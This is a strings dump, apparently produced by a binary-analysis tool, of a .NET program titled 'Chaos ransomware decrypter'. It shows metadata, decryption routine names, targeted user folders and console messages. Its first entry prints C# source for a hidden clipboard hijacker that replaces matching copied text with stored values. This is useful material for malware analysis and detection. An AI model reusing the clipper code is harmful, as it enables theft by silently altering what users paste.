Metadata Signature: 0x7e94 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 2900
Stream name: #~ 4
DirectoryAddress: 296c Size: 26ec
Stream name: #Strings 12
DirectoryAddress: 5058 Size: 18e0
Stream name: #US 4
DirectoryAddress: 6938 Size: 10
Stream name: #GUID 8
DirectoryAddress: 6948 Size: e74
Stream name: #Blob 8
[Strings]
nth  paddr      vaddr      len  size section type    string
1230 0x00033fde 0x00435dde 1910 1911 .text   ascii   Replace(currentClipboard, Program.appMutex);\r\n                            SetText(result);\r\n                        }\r\n                    }\r\n                    else {\r\n                        if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex2))\r\n                        {\r\n\r\n                            string result = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex2);\r\n                            SetText(result);\r\n                        }\r\n                    }\r\n\r\n                }\r\n                base.WndProc(ref m);\r\n            }\r\n            protected override CreateParams CreateParams\r\n            {\r\n                get\r\n                {\r\n                    var cp = base.CreateParams;\r\n                    cp.ExStyle |= 0x80;\r\n                    return cp;\r\n                }\r\n            }\r\n\r\n            public static string GetText()\r\n            {\r\n                string ReturnValue = string.Empty;\r\n                System.Threading.Thread STAThread = new System.Threading.Thread(\r\n                    delegate()\r\n                    {\r\n                        ReturnValue = System.Windows.Forms.Clipboard.GetText();\r\n                    });\r\n                STAThread.SetApartmentState(System.Threading.ApartmentState.STA);\r\n                STAThread.Start();\r\n                STAThread.Join();\r\n\r\n                return ReturnValue;\r\n            }\r\n\r\n            public static void SetText(string txt)\r\n            {\r\n                System.Threading.Thread STAThread = new System.Threading.Thread(\r\n                    delegate()\r\n                    {\r\n                        System.Windows.Forms.Clipboard.SetText(txt);\r\n                    });\r\n                STAThread.SetApartmentState(System.Threading.ApartmentState.STA);\r\n                STAThread.Start();\r\n                STAThread.Join();\r\n            }\r\n        }\r\n
1231 0x00034755 0x00436555 12   13   .text   ascii   \n    }\r\n}\r\n 
1232 0x000347b2 0x004365b2 44   45   .text   ascii   !This program cannot be run in DOS mode.\r\r\n$
1233 0x000348dd 0x004366dd 5    6    .text   ascii   .text
1234 0x00034904 0x00436704 6    7    .text   ascii   `.rsrc
1235 0x0003492c 0x0043672c 7    8    .text   ascii   @.reloc
1236 0x000349e7 0x004367e7 4    5    .text   ascii   \n\v\a(
1237 0x00034b1e 0x0043691e 4    5    .text   ascii   \n\bo"
1238 0x00034bf6 0x004369f6 5    6    .text   ascii   \n\n*\e0
1239 0x00034efb 0x00436cfb 4    5    .text   ascii   \a\b\e0
1240 0x00034f1c 0x00436d1c 4    5    .text   ascii   \n\vs2
1241 0x00034f86 0x00436d86 4    5    .text   ascii   \b\to=
1242 0x00034fd4 0x00436dd4 6    7    .text   ascii   \a-\a\toA
1243 0x00034fea 0x00436dea 6    7    .text   ascii   \a-\a\boA
1244 0x00035057 0x00436e57 5    6    .text   ascii   \n\v\a(D
1245 0x00035170 0x00436f70 4    5    .text   ascii   \n\f\a\b
1246 0x00035179 0x00436f79 4    5    .text   ascii   \n\r(P
1247 0x0003517f 0x00436f7f 4    5    .text   ascii   \n\toT
1248 0x000351a6 0x00436fa6 5    6    .text   ascii   -\a\aoA
1249 0x00035248 0x00437048 4    5    .text   ascii   \v\a-;
1250 0x000352f8 0x004370f8 4    5    .text   ascii   \f\b-"
1251 0x0003538d 0x0043718d 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1252 0x0003542a 0x0043722a 113  114  .text   ascii   hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD8]
1253 0x000354a6 0x004372a6 27   56   .text   utf16le background_wallpaper_blue_2
1254 0x000354f7 0x004372f7 82   83   .text   ascii   QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
1255 0x0003554f 0x0043734f 21   22   .text   ascii   System.Drawing.Bitmap
1256 0x00035569 0x00437369 5    6    .text   ascii   Data\a
1257 0x00035588 0x00437388 4    5    .text   ascii   JFIF
1258 0x000355ab 0x004373ab 5    6    .text   ascii   \n\n\t\t\n
1259 0x000355c7 0x004373c7 9    10   .text   ascii    , #&')*)
1260 0x000355d2 0x004373d2 9    10   .text   ascii   -0-(0%()(
1261 0x000355e0 0x004373e0 6    7    .text   ascii   \a\a\a\n\b\n
1262 0x000355ee 0x004373ee 50   51   .text   ascii   ((((((((((((((((((((((((((((((((((((((((((((((((((
1263 0x0003b460 0x0043d260 5    6    .text   ascii   \vBSJB
1264 0x0003b471 0x0043d271 10   11   .text   ascii   v4.0.30319
1265 0x0003b495 0x0043d295 8    9    .text   ascii   #Strings
1266 0x0003b4b5 0x0043d2b5 5    6    .text   ascii   #GUID
1267 0x0003b4c5 0x0043d2c5 5    6    .text   ascii   #Blob
1268 0x0003b6c5 0x0043d4c5 4    5    .text   ascii   R\n:\n
1269 0x0003bc26 0x0043da26 8    9    .text   ascii   <Module>
1270 0x0003bc2f 0x0043da2f 30   31   .text   ascii   Chaos ransomware decrypter.exe
1271 0x0003bc4e 0x0043da4e 7    8    .text   ascii   Program
1272 0x0003bc56 0x0043da56 20   21   .text   ascii   ConsoleApplication15
1273 0x0003bc6b 0x0043da6b 9    10   .text   ascii   Resources
1274 0x0003bc75 0x0043da75 20   21   .text   ascii   decrypter.Properties
1275 0x0003bc8a 0x0043da8a 8    9    .text   ascii   mscorlib
1276 0x0003bc93 0x0043da93 6    7    .text   ascii   System
1277 0x0003bc9a 0x0043da9a 6    7    .text   ascii   Object
1278 0x0003bca1 0x0043daa1 8    9    .text   ascii   userName
1279 0x0003bcaa 0x0043daaa 7    8    .text   ascii   userDir
1280 0x0003bcb2 0x0043dab2 11   12   .text   ascii   base64Image
1281 0x0003bcbe 0x0043dabe 16   17   .text   ascii   privateKeyString
1282 0x0003bccf 0x0043dacf 14   15   .text   ascii   decryptedFiles
1283 0x0003bcde 0x0043dade 20   21   .text   ascii   SystemParametersInfo
1284 0x0003bcf3 0x0043daf3 4    5    .text   ascii   Main
1285 0x0003bcf8 0x0043daf8 10   11   .text   ascii   privateKey
1286 0x0003bd03 0x0043db03 16   17   .text   ascii   decryptDirectory
1287 0x0003bd14 0x0043db14 18   19   .text   ascii   lookForDirectories
1288 0x0003bd27 0x0043db27 11   12   .text   ascii   AES_Decrypt
1289 0x0003bd33 0x0043db33 11   12   .text   ascii   DecryptFile
1290 0x0003bd3f 0x0043db3f 7    8    .text   ascii   Decrypt
1291 0x0003bd47 0x0043db47 6    7    .text   ascii   Random
1292 0x0003bd4e 0x0043db4e 6    7    .text   ascii   random
1293 0x0003bd55 0x0043db55 12   13   .text   ascii   RandomString
1294 0x0003bd62 0x0043db62 12   13   .text   ascii   SetWallpaper
1295 0x0003bd6f 0x0043db6f 5    6    .text   ascii   .ctor
1296 0x0003bd75 0x0043db75 16   17   .text   ascii   System.Resources
1297 0x0003bd86 0x0043db86 15   16   .text   ascii   ResourceManager
1298 0x0003bd96 0x0043db96 11   12   .text   ascii   resourceMan
1299 0x0003bda2 0x0043dba2 20   21   .text   ascii   System.Globalization
1300 0x0003bdb7 0x0043dbb7 11   12   .text   ascii   CultureInfo
1301 0x0003bdc3 0x0043dbc3 15   16   .text   ascii   resourceCulture
1302 0x0003bdd3 0x0043dbd3 19   20   .text   ascii   get_ResourceManager
1303 0x0003bde7 0x0043dbe7 11   12   .text   ascii   get_Culture
1304 0x0003bdf3 0x0043dbf3 11   12   .text   ascii   set_Culture
1305 0x0003bdff 0x0043dbff 14   15   .text   ascii   System.Drawing
1306 0x0003be0e 0x0043dc0e 6    7    .text   ascii   Bitmap
1307 0x0003be15 0x0043dc15 31   32   .text   ascii   get_background_wallpaper_blue_2
1308 0x0003be35 0x0043dc35 7    8    .text   ascii   Culture
1309 0x0003be3d 0x0043dc3d 27   28   .text   ascii   background_wallpaper_blue_2
1310 0x0003be59 0x0043dc59 6    7    .text   ascii   action
1311 0x0003be60 0x0043dc60 6    7    .text   ascii   uParam
1312 0x0003be67 0x0043dc67 6    7    .text   ascii   vParam
1313 0x0003be6e 0x0043dc6e 6    7    .text   ascii   winIni
1314 0x0003be75 0x0043dc75 4    5    .text   ascii   args
1315 0x0003be7a 0x0043dc7a 8    9    .text   ascii   location
1316 0x0003be83 0x0043dc83 18   19   .text   ascii   bytesToBeDecrypted
1317 0x0003be96 0x0043dc96 13   14   .text   ascii   passwordBytes
1318 0x0003bea4 0x0043dca4 4    5    .text   ascii   file
1319 0x0003bea9 0x0043dca9 13   14   .text   ascii   textToDecrypt
1320 0x0003beb7 0x0043dcb7 6    7    .text   ascii   length
1321 0x0003bebe 0x0043dcbe 6    7    .text   ascii   base64
1322 0x0003bec5 0x0043dcc5 5    6    .text   ascii   value
1323 0x0003becb 0x0043dccb 25   26   .text   ascii   System.Runtime.Versioning
1324 0x0003bee5 0x0043dce5 24   25   .text   ascii   TargetFrameworkAttribute
1325 0x0003befe 0x0043dcfe 17   18   .text   ascii   System.Reflection
1326 0x0003bf10 0x0043dd10 22   23   .text   ascii   AssemblyTitleAttribute
1327 0x0003bf27 0x0043dd27 28   29   .text   ascii   AssemblyDescriptionAttribute
1328 0x0003bf44 0x0043dd44 30   31   .text   ascii   AssemblyConfigurationAttribute
1329 0x0003bf63 0x0043dd63 24   25   .text   ascii   AssemblyCompanyAttribute
1330 0x0003bf7c 0x0043dd7c 24   25   .text   ascii   AssemblyProductAttribute
1331 0x0003bf95 0x0043dd95 26   27   .text   ascii   AssemblyCopyrightAttribute
1332 0x0003bfb0 0x0043ddb0 26   27   .text   ascii   AssemblyTrademarkAttribute
1333 0x0003bfcb 0x0043ddcb 24   25   .text   ascii   AssemblyCultureAttribute
1334 0x0003bfe4 0x0043dde4 30   31   .text   ascii   System.Runtime.InteropServices
1335 0x0003c003 0x0043de03 19   20   .text   ascii   ComVisibleAttribute
1336 0x0003c017 0x0043de17 13   14   .text   ascii   GuidAttribute
1337 0x0003c025 0x0043de25 24   25   .text   ascii   AssemblyVersionAttribute
1338 0x0003c03e 0x0043de3e 28   29   .text   ascii   AssemblyFileVersionAttribute
1339 0x0003c05b 0x0043de5b 18   19   .text   ascii   System.Diagnostics
1340 0x0003c06e 0x0043de6e 19   20   .text   ascii   DebuggableAttribute
1341 0x0003c082 0x0043de82 14   15   .text   ascii   DebuggingModes
1342 0x0003c091 0x0043de91 31   32   .text   ascii   System.Runtime.CompilerServices
1343 0x0003c0b1 0x0043deb1 31   32   .text   ascii   CompilationRelaxationsAttribute
1344 0x0003c0d1 0x0043ded1 29   30   .text   ascii   RuntimeCompatibilityAttribute
1345 0x0003c0ef 0x0043deef 26   27   .text   ascii   Chaos ransomware decrypter
1346 0x0003c10a 0x0043df0a 18   19   .text   ascii   DllImportAttribute
1347 0x0003c11d 0x0043df1d 10   11   .text   ascii   user32.dll
1348 0x0003c128 0x0043df28 7    8    .text   ascii   Console
1349 0x0003c130 0x0043df30 9    10   .text   ascii   set_Title
1350 0x0003c13a 0x0043df3a 8    9    .text   ascii   Assembly
1351 0x0003c143 0x0043df43 16   17   .text   ascii   GetEntryAssembly
1352 0x0003c154 0x0043df54 12   13   .text   ascii   get_Location
1353 0x0003c161 0x0043df61 9    10   .text   ascii   System.IO
1354 0x0003c16b 0x0043df6b 4    5    .text   ascii   Path
1355 0x0003c170 0x0043df70 16   17   .text   ascii   GetDirectoryName
1356 0x0003c181 0x0043df81 6    7    .text   ascii   String
1357 0x0003c188 0x0043df88 6    7    .text   ascii   Concat
1358 0x0003c18f 0x0043df8f 4    5    .text   ascii   File
1359 0x0003c194 0x0043df94 6    7    .text   ascii   Exists
1360 0x0003c19b 0x0043df9b 11   12   .text   ascii   ReadAllText
1361 0x0003c1a7 0x0043dfa7 9    10   .text   ascii   WriteLine
1362 0x0003c1b1 0x0043dfb1 14   15   .text   ascii   ConsoleKeyInfo
1363 0x0003c1c0 0x0043dfc0 7    8    .text   ascii   ReadKey
1364 0x0003c1c8 0x0043dfc8 16   17   .text   ascii   System.Threading
1365 0x0003c1d9 0x0043dfd9 6    7    .text   ascii   Thread
1366 0x0003c1e0 0x0043dfe0 5    6    .text   ascii   Sleep
1367 0x0003c1e6 0x0043dfe6 7    8    .text   ascii   Convert
1368 0x0003c1ee 0x0043dfee 8    9    .text   ascii   ToString
1369 0x0003c1f7 0x0043dff7 11   12   .text   ascii   Environment
1370 0x0003c203 0x0043e003 13   14   .text   ascii   SpecialFolder
1371 0x0003c211 0x0043e011 13   14   .text   ascii   GetFolderPath
1372 0x0003c21f 0x0043e01f 7    8    .text   ascii   Process
1373 0x0003c227 0x0043e027 12   13   .text   ascii   GetProcesses
1374 0x0003c234 0x0043e034 13   14   .text   ascii   ProcessModule
1375 0x0003c242 0x0043e042 14   15   .text   ascii   get_MainModule
1376 0x0003c251 0x0043e051 12   13   .text   ascii   get_FileName
1377 0x0003c25e 0x0043e05e 8    9    .text   ascii   Contains
1378 0x0003c267 0x0043e067 4    5    .text   ascii   Kill
1379 0x0003c26c 0x0043e06c 9    10   .text   ascii   Directory
1380 0x0003c276 0x0043e076 8    9    .text   ascii   GetFiles
1381 0x0003c27f 0x0043e07f 6    7    .text   ascii   Delete
1382 0x0003c286 0x0043e086 11   12   .text   ascii   System.Text
1383 0x0003c292 0x0043e092 13   14   .text   ascii   StringBuilder
1384 0x0003c2a0 0x0043e0a0 12   13   .text   ascii   GetExtension
1385 0x0003c2ad 0x0043e0ad 11   12   .text   ascii   GetFileName
1386 0x0003c2b9 0x0043e0b9 8    9    .text   ascii   FileInfo
1387 0x0003c2c2 0x0043e0c2 14   15   .text   ascii   FileSystemInfo
1388 0x0003c2d1 0x0043e0d1 14   15   .text   ascii   FileAttributes
1389 0x0003c2e0 0x0043e0e0 14   15   .text   ascii   set_Attributes
1390 0x0003c2ef 0x0043e0ef 10   11   .text   ascii   get_Length
1391 0x0003c2fa 0x0043e0fa 14   15   .text   ascii   GetDirectories
1392 0x0003c309 0x0043e109 9    10   .text   ascii   Exception
1393 0x0003c313 0x0043e113 9    10   .text   ascii   DriveInfo
1394 0x0003c31d 0x0043e11d 9    10   .text   ascii   GetDrives
1395 0x0003c327 0x0043e127 13   14   .text   ascii   op_Inequality
1396 0x0003c335 0x0043e135 4    5    .text   ascii   Byte
1397 0x0003c33a 0x0043e13a 68   69   .text   ascii   <PrivateImplementationDetails>{21A7FD6D-7CEC-41B4-8440-9436DF5E65FE}
1398 0x0003c37f 0x0043e17f 26   27   .text   ascii   CompilerGeneratedAttribute
1399 0x0003c39a 0x0043e19a 19   20   .text   ascii   $$method0x6000006-1
1400 0x0003c3ae 0x0043e1ae 14   15   .text   ascii   RuntimeHelpers
1401 0x0003c3bd 0x0043e1bd 5    6    .text   ascii   Array
1402 0x0003c3c3 0x0043e1c3 18   19   .text   ascii   RuntimeFieldHandle
1403 0x0003c3d6 0x0043e1d6 15   16   .text   ascii   InitializeArray
1404 0x0003c3e6 0x0043e1e6 12   13   .text   ascii   MemoryStream
1405 0x0003c3f3 0x0043e1f3 28   29   .text   ascii   System.Security.Cryptography
1406 0x0003c410 0x0043e210 15   16   .text   ascii   RijndaelManaged
1407 0x0003c420 0x0043e220 18   19   .text   ascii   SymmetricAlgorithm
1408 0x0003c433 0x0043e233 11   12   .text   ascii   set_KeySize
1409 0x0003c43f 0x0043e23f 13   14   .text   ascii   set_BlockSize
1410 0x0003c44d 0x0043e24d 18   19   .text   ascii   Rfc2898DeriveBytes
1411 0x0003c460 0x0043e260 11   12   .text   ascii   get_KeySize
1412 0x0003c46c 0x0043e26c 11   12   .text   ascii   DeriveBytes
1413 0x0003c478 0x0043e278 8    9    .text   ascii   GetBytes
1414 0x0003c481 0x0043e281 7    8    .text   ascii   set_Key
1415 0x0003c489 0x0043e289 13   14   .text   ascii   get_BlockSize
1416 0x0003c497 0x0043e297 6    7    .text   ascii   set_IV
1417 0x0003c49e 0x0043e29e 10   11   .text   ascii   CipherMode
1418 0x0003c4a9 0x0043e2a9 8    9    .text   ascii   set_Mode
1419 0x0003c4b2 0x0043e2b2 16   17   .text   ascii   ICryptoTransform
1420 0x0003c4c3 0x0043e2c3 15   16   .text   ascii   CreateDecryptor
1421 0x0003c4d3 0x0043e2d3 12   13   .text   ascii   CryptoStream
1422 0x0003c4e0 0x0043e2e0 6    7    .text   ascii   Stream
1423 0x0003c4e7 0x0043e2e7 16   17   .text   ascii   CryptoStreamMode
1424 0x0003c4f8 0x0043e2f8 5    6    .text   ascii   Write
1425 0x0003c4fe 0x0043e2fe 5    6    .text   ascii   Close
1426 0x0003c504 0x0043e304 11   12   .text   ascii   IDisposable
1427 0x0003c510 0x0043e310 7    8    .text   ascii   Dispose
1428 0x0003c518 0x0043e318 7    8    .text   ascii   ToArray
1429 0x0003c520 0x0043e320 4    5    .text   ascii   Char
1430 0x0003c525 0x0043e325 5    6    .text   ascii   Split
1431 0x0003c52b 0x0043e32b 7    8    .text   ascii   Reverse
1432 0x0003c533 0x0043e333 30   31   .text   ascii   System.Text.RegularExpressions
1433 0x0003c552 0x0043e352 5    6    .text   ascii   Regex
1434 0x0003c558 0x0043e358 5    6    .text   ascii   Match
1435 0x0003c55e 0x0043e35e 5    6    .text   ascii   Group
1436 0x0003c564 0x0043e364 11   12   .text   ascii   get_Success
1437 0x0003c570 0x0043e370 7    8    .text   ascii   Capture
1438 0x0003c578 0x0043e378 9    10   .text   ascii   get_Value
1439 0x0003c582 0x0043e382 7    8    .text   ascii   Replace
1440 0x0003c58a 0x0043e38a 5    6    .text   ascii   Empty
1441 0x0003c590 0x0043e390 16   17   .text   ascii   FromBase64String
1442 0x0003c5a1 0x0043e3a1 8    9    .text   ascii   Encoding
1443 0x0003c5aa 0x0043e3aa 9    10   .text   ascii   get_ASCII
1444 0x0003c5b4 0x0043e3b4 13   14   .text   ascii   WriteAllBytes
1445 0x0003c5c2 0x0043e3c2 4    5    .text   ascii   Move
1446 0x0003c5c7 0x0043e3c7 8    9    .text   ascii   get_UTF8
1447 0x0003c5d0 0x0043e3d0 24   25   .text   ascii   RSACryptoServiceProvider
1448 0x0003c5e9 0x0043e3e9 19   20   .text   ascii   AsymmetricAlgorithm
1449 0x0003c5fd 0x0043e3fd 13   14   .text   ascii   FromXmlString
1450 0x0003c60b 0x0043e40b 9    10   .text   ascii   GetString
1451 0x0003c615 0x0043e415 19   20   .text   ascii   set_PersistKeyInCsp
1452 0x0003c629 0x0043e429 4    5    .text   ascii   Next
1453 0x0003c62e 0x0043e42e 9    10   .text   ascii   get_Chars
1454 0x0003c638 0x0043e438 6    7    .text   ascii   Append
1455 0x0003c63f 0x0043e43f 11   12   .text   ascii   GetTempPath
1456 0x0003c64b 0x0043e44b 6    7    .text   ascii   .cctor
1457 0x0003c652 0x0043e452 12   13   .text   ascii   get_UserName
1458 0x0003c65f 0x0043e45f 23   24   .text   ascii   System.CodeDom.Compiler
1459 0x0003c677 0x0043e477 22   23   .text   ascii   GeneratedCodeAttribute
1460 0x0003c68e 0x0043e48e 28   29   .text   ascii   DebuggerNonUserCodeAttribute
1461 0x0003c6ab 0x0043e4ab 15   16   .text   ascii   ReferenceEquals
1462 0x0003c6bb 0x0043e4bb 4    5    .text   ascii   Type
1463 0x0003c6c0 0x0043e4c0 17   18   .text   ascii   RuntimeTypeHandle
1464 0x0003c6d2 0x0043e4d2 17   18   .text   ascii   GetTypeFromHandle
1465 0x0003c6e4 0x0043e4e4 12   13   .text   ascii   get_Assembly
1466 0x0003c6f1 0x0043e4f1 9    10   .text   ascii   GetObject
1467 0x0003c6fb 0x0043e4fb 21   22   .text   ascii   System.ComponentModel
1468 0x0003c711 0x0043e511 24   25   .text   ascii   EditorBrowsableAttribute
1469 0x0003c72a 0x0043e52a 20   21   .text   ascii   EditorBrowsableState
1470 0x0003c73f 0x0043e53f 40   41   .text   ascii   decrypter.Properties.Resources.resources
1471 0x0003c76b 0x0043e56b 26   53   .text   utf16le Chaos Ransomware Decrypter
1472 0x0003c7a1 0x0043e5a1 17   35   .text   utf16le \privateKey.chaos
1473 0x0003c7c5 0x0043e5c5 54   109  .text   utf16le ******************************************************
1474 0x0003c833 0x0043e633 54   109  .text   utf16le ****           Private key not found!             ****
1475 0x0003c8a1 0x0043e6a1 54   109  .text   utf16le ****       Decrypting files, please wait          ****
1476 0x0003c911 0x0043e711 31   63   .text   utf16le ***  Scan Completed. Decrypted 
1477 0x0003c951 0x0043e751 11   23   .text   utf16le  files  ***
1478 0x0003c969 0x0043e769 54   109  .text   utf16le ***        Removing ransomware, please wait        ***
1479 0x0003c9d7 0x0043e7d7 54   109  .text   utf16le ***                   Done!                        ***
1480 0x0003ca4d 0x0043e84d 8    18   .text   utf16le \Desktop
1481 0x0003ca5f 0x0043e85f 6    13   .text   utf16le \Links
1482 0x0003ca6d 0x0043e86d 9    19   .text   utf16le \Contacts
1483 0x0003ca81 0x0043e881 10   21   .text   utf16le \Documents
1484 0x0003ca97 0x0043e897 10   21   .text   utf16le \Downloads
1485 0x0003caad 0x0043e8ad 9    20   .text   utf16le \Pictures
1486 0x0003cac1 0x0043e8c1 6    13   .text   utf16le \Music
1487 0x0003cacf 0x0043e8cf 9    19   .text   utf16le \OneDrive
1488 0x0003cae3 0x0043e8e3 12   25   .text   utf16le \Saved Games
1489 0x0003cafd 0x0043e8fd 10   21   .text   utf16le \Favorites
1490 0x0003cb13 0x0043e913 9    19   .text   utf16le \Searches
1491 0x0003cb27 0x0043e927 7    15   .text   utf16le \Videos
1492 0x0003cb37 0x0043e937 30   61   .text   utf16le <EncryptedKey>.+<EncryptedKey>
1493 0x0003cb75 0x0043e975 14   29   .text   utf16le <EncryptedKey>
1494 0x0003cb97 0x0043e997 23   47   .text   utf16le  Decrypted Suceessfully
1495 0x0003d15c 0x0043ef5c 2044 4088 .text   utf16le AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
